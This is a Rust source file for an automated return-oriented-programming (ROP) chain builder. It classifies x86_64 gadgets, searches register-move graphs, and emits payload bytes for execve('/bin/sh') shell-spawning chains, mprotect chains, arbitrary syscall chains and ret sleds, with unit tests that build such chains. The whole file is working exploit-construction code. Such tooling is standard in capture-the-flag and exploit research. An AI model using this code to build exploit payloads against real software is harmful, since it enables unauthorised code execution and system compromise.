//! Automated ROP chain builder.
//!
//! Classifies gadgets by semantic effect and constructs ROP chains
//! via BFS-based register assignment over a move graph.

use std::collections::{HashMap, VecDeque};

use iced_x86::{Code, Decoder, DecoderOptions, FlowControl, Instruction, OpKind, Register};

use crate::error::{Error, Result};
use crate::rop::Gadget;

/// Simplified x86_64 register enum for chain building.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum X64Reg {
    Rax, Rbx, Rcx, Rdx, Rsi, Rdi, Rbp, Rsp,
    R8, R9, R10, R11, R12, R13, R14, R15,
}

impl X64Reg {
    /// Syscall argument register order.
    pub const SYSCALL_ARGS: [X64Reg; 6] = [
        X64Reg::Rdi, X64Reg::Rsi, X64Reg::Rdx,
        X64Reg::R10, X64Reg::R8, X64Reg::R9,
    ];

    /// Calling convention argument register order.
    pub const CALL_ARGS: [X64Reg; 6] = [
        X64Reg::Rdi, X64Reg::Rsi, X64Reg::Rdx,
        X64Reg::Rcx, X64Reg::R8, X64Reg::R9,
    ];

    fn from_iced(reg: Register) -> Option<Self> {
        match reg {
            Register::RAX | Register::EAX => Some(X64Reg::Rax),
            Register::RBX | Register::EBX => Some(X64Reg::Rbx),
            Register::RCX | Register::ECX => Some(X64Reg::Rcx),
            Register::RDX | Register::EDX => Some(X64Reg::Rdx),
            Register::RSI | Register::ESI => Some(X64Reg::Rsi),
            Register::RDI | Register::EDI => Some(X64Reg::Rdi),
            Register::RBP | Register::EBP => Some(X64Reg::Rbp),
            Register::RSP | Register::ESP => Some(X64Reg::Rsp),
            Register::R8 | Register::R8D => Some(X64Reg::R8),
            Register::R9 | Register::R9D => Some(X64Reg::R9),
            Register::R10 | Register::R10D => Some(X64Reg::R10),
            Register::R11 | Register::R11D => Some(X64Reg::R11),
            Register::R12 | Register::R12D => Some(X64Reg::R12),
            Register::R13 | Register::R13D => Some(X64Reg::R13),
            Register::R14 | Register::R14D => Some(X64Reg::R14),
            Register::R15 | Register::R15D => Some(X64Reg::R15),
            _ => None,
        }
    }
}

impl std::fmt::Display for X64Reg {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let s = match self {
            X64Reg::Rax => "rax", X64Reg::Rbx => "rbx",
            X64Reg::Rcx => "rcx", X64Reg::Rdx => "rdx",
            X64Reg::Rsi => "rsi", X64Reg::Rdi => "rdi",
            X64Reg::Rbp => "rbp", X64Reg::Rsp => "rsp",
            X64Reg::R8  => "r8",  X64Reg::R9  => "r9",
            X64Reg::R10 => "r10", X64Reg::R11 => "r11",
            X64Reg::R12 => "r12", X64Reg::R13 => "r13",
            X64Reg::R14 => "r14", X64Reg::R15 => "r15",
        };
        write!(f, "{}", s)
    }
}

/// Semantic classification of a gadget's effect.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum GadgetEffect {
    /// `pop REG; ret` — loads a value from the stack.
    PopReg(X64Reg),
    /// `xor REG, REG; ret` — zeroes a register.
    ZeroReg(X64Reg),
    /// `mov DST, SRC; ret` — register-to-register move.
    MovRegReg { dst: X64Reg, src: X64Reg },
    /// `syscall; ret` or `syscall` at end.
    Syscall,
    /// `ret` only — useful for alignment padding.
    Ret,
    /// `mov [BASE], VAL; ret` — memory write via registers.
    WriteMemReg { base: X64Reg, value: X64Reg },
    /// Unclassified gadget.
    Unknown,
}

/// A gadget with classified semantic effect.
#[derive(Debug, Clone)]
pub struct ClassifiedGadget {
    /// Original gadget data.
    pub gadget: Gadget,
    /// Semantic effect.
    pub effect: GadgetEffect,
    /// Extra stack slots consumed by additional pops.
    pub extra_pops: usize,
}

/// Classify a gadget by decoding its instructions with iced-x86.
pub fn classify_gadget(gadget: &Gadget) -> ClassifiedGadget {
    let mut decoder = Decoder::with_ip(64, &gadget.bytes, gadget.addr, DecoderOptions::NONE);
    let mut insns = Vec::new();

    while decoder.can_decode() {
        let insn = decoder.decode();
        if insn.is_invalid() {
            return ClassifiedGadget {
                gadget: gadget.clone(),
                effect: GadgetEffect::Unknown,
                extra_pops: 0,
            };
        }
        insns.push(insn);
    }

    let effect = classify_insns(&insns);
    let extra_pops = count_extra_pops(&insns, &effect);

    ClassifiedGadget {
        gadget: gadget.clone(),
        effect,
        extra_pops,
    }
}

/// Classify an instruction sequence into a GadgetEffect.
fn classify_insns(insns: &[Instruction]) -> GadgetEffect {
    if insns.is_empty() {
        return GadgetEffect::Unknown;
    }

    // Single instruction: just ret
    if insns.len() == 1 {
        if is_ret(&insns[0]) {
            return GadgetEffect::Ret;
        }
        return GadgetEffect::Unknown;
    }

    // Two+ instructions ending in ret
    if insns.len() >= 2 && insns.last().map(|i| is_ret(i)).unwrap_or(false) {
        let first = &insns[0];

        // pop REG; ret
        if is_pop64(first) {
            if let Some(reg) = X64Reg::from_iced(first.op0_register()) {
                if insns.len() == 2 {
                    return GadgetEffect::PopReg(reg);
                }
                // Multiple pops before ret: classify by the first pop
                // Extra pops counted separately
                return GadgetEffect::PopReg(reg);
            }
        }

        // xor REG, REG; ret  (zeroing idiom)
        if insns.len() == 2 && is_xor_self(first) {
            if let Some(reg) = X64Reg::from_iced(first.op0_register()) {
                return GadgetEffect::ZeroReg(reg);
            }
        }

        // mov REG, REG; ret
        if insns.len() == 2 && is_mov_reg_reg(first) {
            if let (Some(dst), Some(src)) = (
                X64Reg::from_iced(first.op0_register()),
                X64Reg::from_iced(first.op1_register()),
            ) {
                if dst != src {
                    return GadgetEffect::MovRegReg { dst, src };
                }
            }
        }

        // mov [REG], REG; ret
        if insns.len() == 2 && is_mov_mem_reg(first) {
            if let (Some(base), Some(value)) = (
                X64Reg::from_iced(first.memory_base()),
                X64Reg::from_iced(first.op1_register()),
            ) {
                if first.memory_displacement64() == 0 && first.memory_index() == Register::None {
                    return GadgetEffect::WriteMemReg { base, value };
                }
            }
        }

        // syscall; ret
        if insns.len() == 2 && is_syscall(first) {
            return GadgetEffect::Syscall;
        }
    }

    // Also detect syscall as last instruction (without explicit ret)
    if let Some(last) = insns.last() {
        if is_syscall(last) && insns.len() == 1 {
            return GadgetEffect::Syscall;
        }
    }

    GadgetEffect::Unknown
}

fn is_ret(insn: &Instruction) -> bool {
    insn.flow_control() == FlowControl::Return
}

fn is_pop64(insn: &Instruction) -> bool {
    matches!(insn.code(),
        Code::Pop_r64 |
        Code::Pop_rm64
    )
}

fn is_xor_self(insn: &Instruction) -> bool {
    matches!(insn.code(),
        Code::Xor_r32_rm32 | Code::Xor_r64_rm64 |
        Code::Xor_rm32_r32 | Code::Xor_rm64_r64
    ) && insn.op0_register() == insn.op1_register()
}

fn is_mov_reg_reg(insn: &Instruction) -> bool {
    // mov r64, r/m64 (opcode 8B) or mov r/m64, r64 (opcode 89)
    if insn.op0_kind() == OpKind::Register && insn.op1_kind() == OpKind::Register {
        return matches!(insn.code(),
            Code::Mov_r64_rm64 | Code::Mov_r32_rm32 |
            Code::Mov_rm64_r64 | Code::Mov_rm32_r32
        );
    }
    false
}

fn is_mov_mem_reg(insn: &Instruction) -> bool {
    matches!(insn.code(), Code::Mov_rm64_r64 | Code::Mov_rm32_r32)
        && insn.op0_kind() == OpKind::Memory
}

fn is_syscall(insn: &Instruction) -> bool {
    insn.code() == Code::Syscall
}

fn count_extra_pops(insns: &[Instruction], effect: &GadgetEffect) -> usize {
    if !matches!(effect, GadgetEffect::PopReg(_)) {
        return 0;
    }
    // Count all pops except the first one
    insns.iter()
        .filter(|i| is_pop64(i))
        .count()
        .saturating_sub(1)
}

/// A single element in a built ROP chain.
#[derive(Debug, Clone)]
pub struct ChainElement {
    /// Offset within the payload.
    pub offset: usize,
    /// Human-readable description.
    pub description: String,
    /// Value at this position (gadget address or data).
    pub value: u64,
}

/// A built ROP chain ready for deployment.
#[derive(Debug, Clone)]
pub struct RopChain {
    /// Raw payload bytes (little-endian u64 sequence).
    pub payload: Vec<u8>,
    /// Annotated elements.
    pub elements: Vec<ChainElement>,
}

impl RopChain {
    /// Total size in bytes.
    pub fn size(&self) -> usize {
        self.payload.len()
    }
}

/// ROP chain builder using classified gadgets.
pub struct RopChainBuilder {
    classified: Vec<ClassifiedGadget>,
    /// pop REG gadgets indexed by register.
    pop_index: HashMap<X64Reg, Vec<usize>>,
    /// mov (dst, src) gadgets indexed by register pair.
    mov_index: HashMap<(X64Reg, X64Reg), Vec<usize>>,
    /// Indices of syscall gadgets.
    syscall_indices: Vec<usize>,
    /// Indices of write-memory gadgets.
    write_indices: Vec<usize>,
    /// Index of a plain ret gadget (for alignment).
    ret_index: Option<usize>,
    /// Indices of zero-reg gadgets.
    zero_index: HashMap<X64Reg, Vec<usize>>,
}

impl RopChainBuilder {
    /// Create a builder from raw gadgets (classifies them automatically).
    pub fn new(gadgets: &[Gadget]) -> Self {
        let classified: Vec<ClassifiedGadget> = gadgets.iter().map(classify_gadget).collect();
        let mut pop_index: HashMap<X64Reg, Vec<usize>> = HashMap::new();
        let mut mov_index: HashMap<(X64Reg, X64Reg), Vec<usize>> = HashMap::new();
        let mut syscall_indices = Vec::new();
        let mut write_indices = Vec::new();
        let mut ret_index = None;
        let mut zero_index: HashMap<X64Reg, Vec<usize>> = HashMap::new();

        for (i, cg) in classified.iter().enumerate() {
            match &cg.effect {
                GadgetEffect::PopReg(reg) => {
                    pop_index.entry(*reg).or_default().push(i);
                }
                GadgetEffect::MovRegReg { dst, src } => {
                    mov_index.entry((*dst, *src)).or_default().push(i);
                }
                GadgetEffect::Syscall => {
                    syscall_indices.push(i);
                }
                GadgetEffect::WriteMemReg { .. } => {
                    write_indices.push(i);
                }
                GadgetEffect::Ret => {
                    if ret_index.is_none() {
                        ret_index = Some(i);
                    }
                }
                GadgetEffect::ZeroReg(reg) => {
                    zero_index.entry(*reg).or_default().push(i);
                }
                GadgetEffect::Unknown => {}
            }
        }

        // Sort pop gadgets by fewest extra pops (prefer minimal side effects)
        for pops in pop_index.values_mut() {
            pops.sort_by_key(|&i| classified[i].extra_pops);
        }

        Self {
            classified,
            pop_index,
            mov_index,
            syscall_indices,
            write_indices,
            ret_index,
            zero_index,
        }
    }

    /// Summary of available gadget types.
    pub fn summary(&self) -> GadgetSummary {
        GadgetSummary {
            pop_regs: self.pop_index.keys().copied().collect(),
            mov_pairs: self.mov_index.keys().copied().collect(),
            has_syscall: !self.syscall_indices.is_empty(),
            has_write_mem: !self.write_indices.is_empty(),
            has_ret: self.ret_index.is_some(),
            zero_regs: self.zero_index.keys().copied().collect(),
        }
    }

    /// Find a gadget that sets `target_reg` via direct pop or multi-hop transfer.
    ///
    /// Returns a sequence of (gadget_index, value_to_push) pairs.
    fn find_reg_set(&self, target_reg: X64Reg, value: u64) -> Option<Vec<(usize, u64)>> {
        // Direct pop
        if let Some(indices) = self.pop_index.get(&target_reg) {
            if let Some(&idx) = indices.first() {
                let mut result = vec![(idx, value)];
                // Add filler for extra pops
                for _ in 0..self.classified[idx].extra_pops {
                    result.push((usize::MAX, 0)); // sentinel: just push data
                }
                return Some(result);
            }
        }

        // BFS through move graph: find pop SRC; mov TARGET, SRC path
        let mut queue: VecDeque<(X64Reg, Vec<usize>)> = VecDeque::new();
        let mut visited = std::collections::HashSet::new();
        queue.push_back((target_reg, Vec::new()));
        visited.insert(target_reg);

        while let Some((current_reg, mov_path)) = queue.pop_front() {
            // Can we pop into current_reg?
            if let Some(indices) = self.pop_index.get(&current_reg) {
                if let Some(&pop_idx) = indices.first() {
                    let mut result = Vec::new();
                    // First: pop value into source register
                    result.push((pop_idx, value));
                    for _ in 0..self.classified[pop_idx].extra_pops {
                        result.push((usize::MAX, 0));
                    }
                    // Then: apply mov chain to move from source to target
                    for &mov_idx in &mov_path {
                        result.push((mov_idx, u64::MAX)); // no value push needed
                    }
                    return Some(result);
                }
            }

            // Try zero-reg if value is 0
            if value == 0 {
                if let Some(indices) = self.zero_index.get(&current_reg) {
                    if let Some(&zero_idx) = indices.first() {
                        let mut result = vec![(zero_idx, u64::MAX)]; // no value needed
                        for &mov_idx in &mov_path {
                            result.push((mov_idx, u64::MAX));
                        }
                        return Some(result);
                    }
                }
            }

            // Explore mov edges: if mov (current_reg, src_reg) exists,
            // then we need to set src_reg instead
            for (&(dst, src), indices) in &self.mov_index {
                if dst == current_reg && !visited.contains(&src) {
                    visited.insert(src);
                    let mut new_path = vec![indices[0]];
                    new_path.extend_from_slice(&mov_path);
                    queue.push_back((src, new_path));
                }
            }
        }

        None
    }

    /// Emit a sequence that sets a register to a value, appending to the chain.
    fn emit_set_reg(
        &self,
        reg: X64Reg,
        value: u64,
        elements: &mut Vec<ChainElement>,
        payload: &mut Vec<u8>,
    ) -> Result<()> {
        let steps = self.find_reg_set(reg, value).ok_or_else(|| {
            Error::Other(format!("no gadget path to set {} = {:#x}", reg, value))
        })?;

        for (idx, val) in steps {
            if idx == usize::MAX {
                // Filler for extra pop
                let offset = payload.len();
                payload.extend_from_slice(&val.to_le_bytes());
                elements.push(ChainElement {
                    offset,
                    description: "padding (extra pop)".into(),
                    value: val,
                });
            } else if val == u64::MAX {
                // Gadget address only (mov, no data)
                let cg = &self.classified[idx];
                let offset = payload.len();
                payload.extend_from_slice(&cg.gadget.addr.to_le_bytes());
                elements.push(ChainElement {
                    offset,
                    description: format!("{}", cg.gadget.instructions),
                    value: cg.gadget.addr,
                });
            } else {
                // Gadget address + data value
                let cg = &self.classified[idx];
                let offset = payload.len();
                payload.extend_from_slice(&cg.gadget.addr.to_le_bytes());
                elements.push(ChainElement {
                    offset,
                    description: format!("{}", cg.gadget.instructions),
                    value: cg.gadget.addr,
                });
                let offset = payload.len();
                payload.extend_from_slice(&val.to_le_bytes());
                elements.push(ChainElement {
                    offset,
                    description: format!("{} = {:#x}", reg, val),
                    value: val,
                });
            }
        }
        Ok(())
    }

    /// Build a chain that sets registers and invokes a syscall.
    ///
    /// `number` is the syscall number (rax).
    /// `args` are the syscall arguments (rdi, rsi, rdx, r10, r8, r9).
    pub fn build_syscall(&self, number: u64, args: &[u64]) -> Result<RopChain> {
        let mut elements = Vec::new();
        let mut payload = Vec::new();

        // Set rax = syscall number
        self.emit_set_reg(X64Reg::Rax, number, &mut elements, &mut payload)?;

        // Set argument registers
        for (i, &val) in args.iter().enumerate() {
            if i >= X64Reg::SYSCALL_ARGS.len() {
                break;
            }
            self.emit_set_reg(X64Reg::SYSCALL_ARGS[i], val, &mut elements, &mut payload)?;
        }

        // Emit syscall gadget
        let syscall_idx = self.syscall_indices.first().ok_or_else(|| {
            Error::Other("no syscall gadget available".into())
        })?;
        let cg = &self.classified[*syscall_idx];
        let offset = payload.len();
        payload.extend_from_slice(&cg.gadget.addr.to_le_bytes());
        elements.push(ChainElement {
            offset,
            description: format!("{}", cg.gadget.instructions),
            value: cg.gadget.addr,
        });

        Ok(RopChain { payload, elements })
    }

    /// Build an execve("/bin/sh", NULL, NULL) chain.
    ///
    /// `binsh_addr` is the address of the "/bin/sh\0" string.
    pub fn build_execve(&self, binsh_addr: u64) -> Result<RopChain> {
        self.build_syscall(59, &[binsh_addr, 0, 0])
    }

    /// Build a mprotect(addr, len, prot) chain.
    pub fn build_mprotect(&self, addr: u64, len: u64, prot: u64) -> Result<RopChain> {
        self.build_syscall(10, &[addr, len, prot])
    }

    /// Emit a ret gadget for stack alignment.
    pub fn build_ret_sled(&self, count: usize) -> Result<RopChain> {
        let ret_idx = self.ret_index.ok_or_else(|| {
            Error::Other("no ret gadget available".into())
        })?;
        let cg = &self.classified[ret_idx];

        let mut elements = Vec::new();
        let mut payload = Vec::new();
        for _ in 0..count {
            let offset = payload.len();
            payload.extend_from_slice(&cg.gadget.addr.to_le_bytes());
            elements.push(ChainElement {
                offset,
                description: "ret (alignment)".into(),
                value: cg.gadget.addr,
            });
        }
        Ok(RopChain { payload, elements })
    }
}

/// Summary of available gadget types.
#[derive(Debug, Clone)]
pub struct GadgetSummary {
    pub pop_regs: Vec<X64Reg>,
    pub mov_pairs: Vec<(X64Reg, X64Reg)>,
    pub has_syscall: bool,
    pub has_write_mem: bool,
    pub has_ret: bool,
    pub zero_regs: Vec<X64Reg>,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_gadget(addr: u64, bytes: &[u8], instructions: &str) -> Gadget {
        Gadget {
            addr,
            bytes: bytes.to_vec(),
            instructions: instructions.to_string(),
            insn_count: 2,
        }
    }

    #[test]
    fn classify_pop_rdi_ret() {
        let g = make_gadget(0x1000, &[0x5f, 0xc3], "pop rdi; ret");
        let cg = classify_gadget(&g);
        assert_eq!(cg.effect, GadgetEffect::PopReg(X64Reg::Rdi));
        assert_eq!(cg.extra_pops, 0);
    }

    #[test]
    fn classify_pop_rsi_pop_r15_ret() {
        // pop rsi; pop r15; ret
        let g = make_gadget(0x2000, &[0x5e, 0x41, 0x5f, 0xc3], "pop rsi; pop r15; ret");
        let cg = classify_gadget(&g);
        assert_eq!(cg.effect, GadgetEffect::PopReg(X64Reg::Rsi));
        assert_eq!(cg.extra_pops, 1);
    }

    #[test]
    fn classify_xor_eax_eax_ret() {
        // xor eax, eax; ret
        let g = make_gadget(0x3000, &[0x31, 0xc0, 0xc3], "xor eax, eax; ret");
        let cg = classify_gadget(&g);
        assert_eq!(cg.effect, GadgetEffect::ZeroReg(X64Reg::Rax));
    }

    #[test]
    fn classify_syscall_ret() {
        // syscall; ret
        let g = make_gadget(0x4000, &[0x0f, 0x05, 0xc3], "syscall; ret");
        let cg = classify_gadget(&g);
        assert_eq!(cg.effect, GadgetEffect::Syscall);
    }

    #[test]
    fn classify_ret_only() {
        let g = make_gadget(0x5000, &[0xc3], "ret");
        let cg = classify_gadget(&g);
        assert_eq!(cg.effect, GadgetEffect::Ret);
    }

    #[test]
    fn classify_mov_rdi_rax_ret() {
        // mov rdi, rax; ret  =  48 89 c7 c3
        let g = make_gadget(0x6000, &[0x48, 0x89, 0xc7, 0xc3], "mov rdi, rax; ret");
        let cg = classify_gadget(&g);
        assert_eq!(cg.effect, GadgetEffect::MovRegReg {
            dst: X64Reg::Rdi,
            src: X64Reg::Rax,
        });
    }

    #[test]
    fn builder_summary() {
        let gadgets = vec![
            make_gadget(0x1000, &[0x5f, 0xc3], "pop rdi; ret"),
            make_gadget(0x2000, &[0x58, 0xc3], "pop rax; ret"),
            make_gadget(0x3000, &[0x0f, 0x05, 0xc3], "syscall; ret"),
            make_gadget(0x4000, &[0xc3], "ret"),
        ];
        let builder = RopChainBuilder::new(&gadgets);
        let summary = builder.summary();
        assert!(summary.pop_regs.contains(&X64Reg::Rdi));
        assert!(summary.pop_regs.contains(&X64Reg::Rax));
        assert!(summary.has_syscall);
        assert!(summary.has_ret);
    }

    #[test]
    fn build_execve_chain() {
        let gadgets = vec![
            make_gadget(0x1000, &[0x5f, 0xc3], "pop rdi; ret"),         // pop rdi
            make_gadget(0x2000, &[0x58, 0xc3], "pop rax; ret"),         // pop rax
            make_gadget(0x3000, &[0x5e, 0xc3], "pop rsi; ret"),         // pop rsi
            make_gadget(0x4000, &[0x5a, 0xc3], "pop rdx; ret"),         // pop rdx
            make_gadget(0x5000, &[0x0f, 0x05, 0xc3], "syscall; ret"),   // syscall
        ];
        let builder = RopChainBuilder::new(&gadgets);
        let chain = builder.build_execve(0x402000).unwrap();

        // Verify payload is non-empty and contains expected addresses
        assert!(!chain.payload.is_empty());
        assert!(chain.payload.len() % 8 == 0);

        // Extract u64 values from payload
        let values: Vec<u64> = chain.payload
            .chunks_exact(8)
            .map(|c| u64::from_le_bytes(c.try_into().unwrap()))
            .collect();

        // Should contain the gadget addresses and values
        assert!(values.contains(&0x2000)); // pop rax gadget
        assert!(values.contains(&59));     // execve syscall number
        assert!(values.contains(&0x1000)); // pop rdi gadget
        assert!(values.contains(&0x402000)); // /bin/sh address
        assert!(values.contains(&0x5000)); // syscall gadget
    }

    #[test]
    fn build_syscall_chain() {
        let gadgets = vec![
            make_gadget(0x1000, &[0x5f, 0xc3], "pop rdi; ret"),
            make_gadget(0x2000, &[0x58, 0xc3], "pop rax; ret"),
            make_gadget(0x3000, &[0x5e, 0xc3], "pop rsi; ret"),
            make_gadget(0x4000, &[0x5a, 0xc3], "pop rdx; ret"),
            make_gadget(0x5000, &[0x0f, 0x05, 0xc3], "syscall; ret"),
        ];
        let builder = RopChainBuilder::new(&gadgets);

        // write(1, buf, len)
        let chain = builder.build_syscall(1, &[1, 0x402000, 0x100]).unwrap();
        assert!(!chain.payload.is_empty());

        let values: Vec<u64> = chain.payload
            .chunks_exact(8)
            .map(|c| u64::from_le_bytes(c.try_into().unwrap()))
            .collect();
        assert!(values.contains(&1)); // syscall number (write) and fd
        assert!(values.contains(&0x402000)); // buf
        assert!(values.contains(&0x100)); // len
    }

    #[test]
    fn build_with_multi_hop() {
        // Only pop rax available; need mov rdi, rax to set rdi
        let gadgets = vec![
            make_gadget(0x1000, &[0x58, 0xc3], "pop rax; ret"),
            make_gadget(0x2000, &[0x48, 0x89, 0xc7, 0xc3], "mov rdi, rax; ret"),
            make_gadget(0x3000, &[0x0f, 0x05, 0xc3], "syscall; ret"),
            make_gadget(0x4000, &[0x5e, 0xc3], "pop rsi; ret"),
            make_gadget(0x5000, &[0x5a, 0xc3], "pop rdx; ret"),
        ];
        let builder = RopChainBuilder::new(&gadgets);
        let chain = builder.build_execve(0x402000).unwrap();

        let values: Vec<u64> = chain.payload
            .chunks_exact(8)
            .map(|c| u64::from_le_bytes(c.try_into().unwrap()))
            .collect();

        // Should use pop rax + mov rdi, rax to set rdi
        assert!(values.contains(&0x1000)); // pop rax
        assert!(values.contains(&0x2000)); // mov rdi, rax
        assert!(values.contains(&0x402000)); // /bin/sh
    }

    #[test]
    fn build_missing_gadget_fails() {
        // No pop rax -> can't set syscall number
        let gadgets = vec![
            make_gadget(0x1000, &[0x5f, 0xc3], "pop rdi; ret"),
            make_gadget(0x5000, &[0x0f, 0x05, 0xc3], "syscall; ret"),
        ];
        let builder = RopChainBuilder::new(&gadgets);
        assert!(builder.build_execve(0x402000).is_err());
    }

    #[test]
    fn ret_sled() {
        let gadgets = vec![
            make_gadget(0x1000, &[0xc3], "ret"),
        ];
        let builder = RopChainBuilder::new(&gadgets);
        let chain = builder.build_ret_sled(3).unwrap();
        assert_eq!(chain.payload.len(), 24); // 3 * 8 bytes
        let values: Vec<u64> = chain.payload
            .chunks_exact(8)
            .map(|c| u64::from_le_bytes(c.try_into().unwrap()))
            .collect();
        assert!(values.iter().all(|&v| v == 0x1000));
    }

    #[test]
    fn extra_pop_padding() {
        // pop rsi; pop r15; ret — has 1 extra pop
        let gadgets = vec![
            make_gadget(0x1000, &[0x58, 0xc3], "pop rax; ret"),
            make_gadget(0x2000, &[0x5e, 0x41, 0x5f, 0xc3], "pop rsi; pop r15; ret"),
            make_gadget(0x3000, &[0x0f, 0x05, 0xc3], "syscall; ret"),
            make_gadget(0x4000, &[0x5f, 0xc3], "pop rdi; ret"),
            make_gadget(0x5000, &[0x5a, 0xc3], "pop rdx; ret"),
        ];
        let builder = RopChainBuilder::new(&gadgets);
        let chain = builder.build_syscall(1, &[1, 0x402000, 0x100]).unwrap();
        // Chain should include padding for the extra r15 pop
        assert!(chain.elements.iter().any(|e| e.description.contains("padding")));
    }
}
